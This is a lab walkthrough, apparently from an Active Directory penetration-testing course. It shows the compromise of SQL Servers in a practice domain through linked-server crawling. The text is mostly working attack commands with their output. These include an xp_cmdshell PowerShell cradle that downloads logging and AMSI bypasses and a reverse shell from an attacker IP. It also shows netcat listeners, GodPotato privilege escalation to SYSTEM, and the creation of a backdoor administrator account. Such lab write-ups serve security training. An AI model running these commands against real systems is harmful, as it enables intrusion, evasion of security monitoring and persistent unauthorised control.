- Discover Active Directory Domain SQL Server Instances.
```
PS C:\AD\MyTools> ipmo .\PowerUpSQL-master\PowerUpSQL.ps1
PS C:\AD\MyTools\PowerUpSQL\PowerUpSQL> Get-SQLInstanceDomain


ComputerName     : dcorp-mgmt.dollarcorp.moneycorp.local
Instance         : dcorp-mgmt.dollarcorp.moneycorp.local,1433
DomainAccountSid : 15000005210001391322314218022427222724713123394400
DomainAccount    : svcadmin
DomainAccountCn  : svc admin
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433
LastLogon        : 11/25/2022 6:02 AM
Description      : Account to be used for services which need high privileges.

ComputerName     : dcorp-mgmt.dollarcorp.moneycorp.local
Instance         : dcorp-mgmt.dollarcorp.moneycorp.local
DomainAccountSid : 15000005210001391322314218022427222724713123394400
DomainAccount    : svcadmin
DomainAccountCn  : svc admin
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
LastLogon        : 11/25/2022 6:02 AM
Description      : Account to be used for services which need high privileges.

ComputerName     : dcorp-mssql.dollarcorp.moneycorp.local
Instance         : dcorp-mssql.dollarcorp.moneycorp.local,1433
DomainAccountSid : 15000005210001391322314218022427222724713123385400
DomainAccount    : DCORP-MSSQL$
DomainAccountCn  : DCORP-MSSQL
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local:1433
LastLogon        : 8/10/2023 11:54 PM
Description      :

ComputerName     : dcorp-mssql.dollarcorp.moneycorp.local
Instance         : dcorp-mssql.dollarcorp.moneycorp.local
DomainAccountSid : 15000005210001391322314218022427222724713123385400
DomainAccount    : DCORP-MSSQL$
DomainAccountCn  : DCORP-MSSQL
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local
LastLogon        : 8/10/2023 11:54 PM
Description      :

ComputerName     : dcorp-sql1.dollarcorp.moneycorp.local
Instance         : dcorp-sql1.dollarcorp.moneycorp.local,1433
DomainAccountSid : 15000005210001391322314218022427222724713123386400
DomainAccount    : DCORP-SQL1$
DomainAccountCn  : DCORP-SQL1
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-sql1.dollarcorp.moneycorp.local:1433
LastLogon        : 8/10/2023 11:54 PM
Description      :

ComputerName     : dcorp-sql1.dollarcorp.moneycorp.local
Instance         : dcorp-sql1.dollarcorp.moneycorp.local
DomainAccountSid : 15000005210001391322314218022427222724713123386400
DomainAccount    : DCORP-SQL1$
DomainAccountCn  : DCORP-SQL1
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-sql1.dollarcorp.moneycorp.local
LastLogon        : 8/10/2023 11:54 PM
Description      :
```

- Get general server information such as SQL/OS versions, service accounts and sysdmin access.
```
PS C:\AD\MyTools\PowerUpSQL\PowerUpSQL> Get-SQLInstanceDomain | Get-SQLServerinfo


ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1888
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student303
IsSysadmin             : No
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1888
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student303
IsSysadmin             : No
ActiveSessions         : 1
```

- Crawl the database links.
```
PS C:\AD\MyTools\PowerUpSQL\PowerUpSQL> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local


Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student303
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

- Enumerate command execution rights on database servers.
```
PS C:\AD\MyTools\PowerUpSQL\PowerUpSQL> Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student303
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

- We have command execution rights on `EU-SQL.EU.EUROCORP.LOCAL` (look at the `CustomQuery` field above).
- We can try to get a reverse shell on this database server (host the necessary files on HFS).
```
PS C:\AD\MyTools\PowerUpSQL\PowerUpSQL> Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.3/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.3/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.3/Invoke-PowerShellTcp.ps1)"''' -QueryTarget eu-sql
```

```
PS C:\AD\MyTools> .\nc64.exe -lvnp 443
listening on [any] 443 ...
connect to [172.16.100.3] from (UNKNOWN) [172.16.15.17] 52553
Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>hostname
eu-sql
PS C:\Windows\system32> whoami
nt authority\network service
PS C:\AD\MyTools\PowerUpSQL\PowerUpSQL> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\Windows\system32> net user /domain
The request will be processed at a domain controller for domain eu.eurocorp.local.


User accounts for \\eu-dc.eu.eurocorp.local

-------------------------------------------------------------------------------
Administrator            dbadmin                  Guest
krbtgt
The command completed successfully.
```

- Local privilege escalation with `GodPotato.exe` is possible due to our current privileges.
```
PS C:\Windows\Tasks> .\GodPotato-NET4.exe -cmd "C:\Windows\Tasks\nc.exe -t -e C:\Windows\System32\cmd.exe 172.16.99.3 2012"
```

```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# rlwrap nc -lvnp 2012
listening on [any] 2012 ...
connect to [172.16.99.3] from (UNKNOWN) [172.16.15.17] 52848
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Tasks>whoami
whoami
nt authority\system

C:\Windows\Tasks>net user testuser WKrByFR7 /add
net user testuser WKrByFR7 /add
The command completed successfully.


C:\Windows\Tasks>net localgroup Administrators testuser /add
net localgroup Administrators testuser /add
The command completed successfully.
```